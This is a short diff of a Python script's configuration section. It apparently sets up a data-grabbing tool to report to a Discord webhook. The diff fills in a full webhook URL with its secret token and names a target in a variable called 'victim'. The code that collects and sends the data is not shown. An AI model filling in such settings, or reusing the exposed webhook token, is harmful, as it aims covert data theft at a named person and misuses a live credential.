@@ -13,9 +13,9 @@ except:
     sys.exit()
 
 #config
-hook = "ENTER_WEBHOOK"
-victim = "VICTIM_NAME"
-ping = "@everyone" #Leave blank for no ping
+hook = "https://discord.com/api/webhooks/995541690540642314/scPOVZ1hAhoAYsD8IB8E4v2wEgHDB6KMe7Vi2Cjakyv8uTuqzjX917aZ6bL7OP-jPp4J"
+victim = "Four"
+ping = "" #Leave blank for no ping
 
 
 """
